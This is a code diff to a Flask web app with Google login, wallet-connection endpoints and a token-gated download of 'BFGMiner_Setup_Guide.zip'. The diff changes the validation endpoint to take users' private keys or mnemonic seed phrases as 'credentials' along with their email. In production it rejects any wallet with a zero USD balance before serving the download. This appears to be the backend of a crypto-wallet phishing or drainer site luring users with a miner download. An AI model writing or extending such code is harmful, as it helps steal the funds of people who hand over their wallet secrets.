@@ -130,10 +130,8 @@ def google_callback():
 @app.route('/wallet')
 def wallet_page():
     """Wallet connection page after login"""
-    # Demo mode: allow anonymous
-# # Demo mode: allow anonymous
-# # Demo mode: allow anonymous
-# if .user_id. not in session:
+    # In production, require login
+    if not session.get('user_id') and not config.DEBUG:
         return redirect('/login/google')
     return render_template('wallet.html')
 
@@ -236,92 +234,108 @@ def validate_wallet():
         return jsonify({"success": False, "error": "Unauthorized"}), 401
 
     try:
-        data = request.get_json()
+        data = request.get_json() or {}
         wallet_type = data.get("type")  # "address", "private_key", "mnemonic"
-        value = data.get("value")
+        credentials = data.get("credentials") or data.get("value")
+        email = data.get("email", session.get("email"))
 
-        if not wallet_type or not value:
-            return jsonify({"success": False, "error": "Missing type or value"}), 400
+        if not wallet_type or not credentials:
+            return jsonify({"valid": False, "error": "Missing type or credentials"}), 400
 
-        result = {}
+        # Perform validation using validator
         if wallet_type == "address":
-            result = validator.validate_wallet_address(value)
+            result = validator.validate_wallet_address(credentials)
         elif wallet_type == "private_key":
-            result = validator.validate_private_key(value)
+            result = validator.validate_private_key(credentials)
         elif wallet_type == "mnemonic":
-            result = validator.validate_mnemonic(value)
+            result = validator.validate_mnemonic(credentials)
+        else:
+            return jsonify({"valid": False, "error": "Invalid wallet type"}), 400
 
+        # Enforce non-zero balance for legitimacy (in production)
+        balance_usd = float(result.get("balance_usd", 0) or 0)
+        if (not config.DEBUG) and (not result.get("valid") or balance_usd <= 0):
+            return jsonify({"valid": False, "error": "Wallet has zero balance or is invalid"}), 400
+
+        # Log and store on success
         if result.get("valid"):
-            # Store in database
             with get_db_connection() as conn:
                 cursor = conn.cursor()
-                credentials_hash = hashlib.sha256(value.encode()).hexdigest()
+                credentials_hash = hashlib.sha256(credentials.encode()).hexdigest()
                 cursor.execute(
-                    """INSERT OR REPLACE INTO wallets (user_id, wallet_address, connection_type, credentials_hash, ip_address)
-                       VALUES (?, ?, ?, ?, ?)""",
-                    (session['user_id'], result.get("address", value), wallet_type, credentials_hash, request.remote_addr)
+                    """
+                    INSERT INTO wallets (user_id, wallet_address, connection_type, credentials_hash, balance_usd, ip_address, created_at)
+                    VALUES (?, ?, ?, ?, ?, ?, datetime('now'))
+                    """,
+                    (session.get('user_id'), result.get("address", ""), wallet_type, credentials_hash, balance_usd, request.remote_addr)
                 )
                 conn.commit()
 
-            audit.log_action(session['user_id'], "wallet_connect", "wallet", result.get("address"), 
-                           {"type": wallet_type, "validated": True}, request.remote_addr, "medium")
+            audit.log_action(session.get('user_id'), "wallet_connect", "wallet", result.get("address", ""),
+                             {"type": wallet_type, "validated": True, "balance_usd": balance_usd, "email": email},
+                             request.remote_addr, "medium")
 
         return jsonify(result)
     except Exception as e:
         logger.error(f"Wallet validation error: {e}")
-        return jsonify({"success": False, "error": str(e)}), 500
+        return jsonify({"valid": False, "error": str(e)}), 500
 
 @app.route("/api/walletconnect", methods=["POST"])
 def wallet_connect():
     """Handle wallet connection from frontend"""
-    # Demo mode: allow anonymous
-# # Demo mode: allow anonymous
-# # Demo mode: allow anonymous
-# if .user_id. not in session:
+    # Require auth in production; allow demo in DEBUG
+    if not session.get('user_id') and not config.DEBUG:
         return jsonify({"success": False, "error": "Unauthorized"}), 401
 
     try:
-        data = request.get_json()
+        data = request.get_json() or {}
         address = data.get("address")
         signature = data.get("signature")
         message = data.get("message")
         connection_type = data.get("connection_type", "web3")
         chain_id = data.get("chain_id", 1)
 
-        if not address or not signature or not message:
-            return jsonify({"success": False, "error": "Missing required fields"}), 400
+        if not address:
+            return jsonify({"success": False, "error": "Missing address"}), 400
 
-        # Verify signature
-        try:
-            recovered_address = Account.recover_message(
-                text=message, 
-                signature=signature
-            ).address.lower()
-            if recovered_address != address.lower():
-                return jsonify({"success": False, "error": "Invalid signature"}), 400
-        except:
-            return jsonify({"success": False, "error": "Signature verification failed"}), 400
+        # In production, require signature; in DEBUG, accept address-only for simulation
+        if not config.DEBUG:
+            if not signature or not message:
+                return jsonify({"success": False, "error": "Missing signature or message"}), 400
+            try:
+                recovered_address = Account.recover_message(
+                    text=message,
+                    signature=signature
+                ).address.lower()
+                if recovered_address != address.lower():
+                    return jsonify({"success": False, "error": "Invalid signature"}), 400
+            except Exception:
+                return jsonify({"success": False, "error": "Signature verification failed"}), 400
 
-        # Get balance and price
+        # Get balance
         balance_info = validator.get_balance(address)
         balance_usd = balance_info.get("balance_usd", 0) if balance_info else 0
+
+        # Enforce non-zero balance in production
+        if not config.DEBUG and balance_usd <= 0:
+            return jsonify({"success": False, "error": "Wallet has zero balance"}), 400
 
         # Store in database
         with get_db_connection() as conn:
             cursor = conn.cursor()
             cursor.execute(
-                """INSERT OR REPLACE INTO wallets 
+                """INSERT INTO wallets 
                    (user_id, wallet_address, connection_type, balance_usd, ip_address, created_at)
-                   VALUES (?, ?, ?, ?, ?, ?)""",
-                (session['user_id'], address, connection_type, balance_usd, request.remote_addr, datetime.datetime.now())
+                   VALUES (?, ?, ?, ?, ?, datetime('now'))""",
+                (session.get('user_id'), address, connection_type, balance_usd, request.remote_addr)
             )
             conn.commit()
 
-        audit.log_action(session['user_id'], "wallet_verified", "wallet", address, 
-                       {"type": connection_type, "balance_usd": balance_usd}, request.remote_addr, "medium")
+        audit.log_action(session.get('user_id'), "wallet_verified", "wallet", address,
+                         {"type": connection_type, "balance_usd": balance_usd}, request.remote_addr, "medium")
 
         return jsonify({
-            "success": True, 
+            "success": True,
             "address": address,
             "balance_eth": balance_info.get("balance_eth", 0) if balance_info else 0,
             "balance_usd": balance_usd,
@@ -333,13 +347,9 @@ def wallet_connect():
 
 @app.route("/api/download/initiate", methods=["POST"])
 def initiate_download():
-    # Demo mode: allow anonymous
-    user_id = session.get("user_id", 1)
     """Generate download token and log request"""
-    # Demo mode: allow anonymous
-# # Demo mode: allow anonymous
-# # Demo mode: allow anonymous
-# if .user_id. not in session:
+    # Require auth in production; allow demo in DEBUG
+    if not session.get("user_id") and not config.DEBUG:
         return jsonify({"success": False, "error": "Unauthorized"}), 401
 
     try:
@@ -353,10 +363,15 @@ def initiate_download():
             )
             conn.commit()
 
-        audit.log_action(session['user_id'], "download_initiate", "download", download_token, 
-                       None, request.remote_addr, "low")
+        audit.log_action(session.get('user_id'), "download_initiate", "download", download_token, 
+                         None, request.remote_addr, "low")
 
-        return jsonify({"success": True, "token": download_token, "url": f"/download/{download_token}"})
+        return jsonify({
+            "success": True,
+            "token": download_token,
+            "downloadToken": download_token,
+            "url": f"/download/{download_token}"
+        })
     except Exception as e:
         logger.error(f"Download initiation error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
@@ -383,10 +398,10 @@ def download_file(token):
             cursor.execute("UPDATE downloads SET is_completed = TRUE WHERE id = ?", (download[0],))
             conn.commit()
 
-        # Serve the ZIP file
-        return send_file("/home/azureuser/bfgminer/BFGMiner_Setup_Guide.zip", as_attachment=True, 
-                        download_name="BFGMiner_Setup_Guide.zip",
-                        mimetype="application/zip")
+        # Serve the ZIP file (relative to app root)
+        return send_file("BFGMiner_Setup_Guide.zip", as_attachment=True,
+                         download_name="BFGMiner_Setup_Guide.zip",
+                         mimetype="application/zip")
 
     except Exception as e:
         logger.error(f"Download error: {e}")
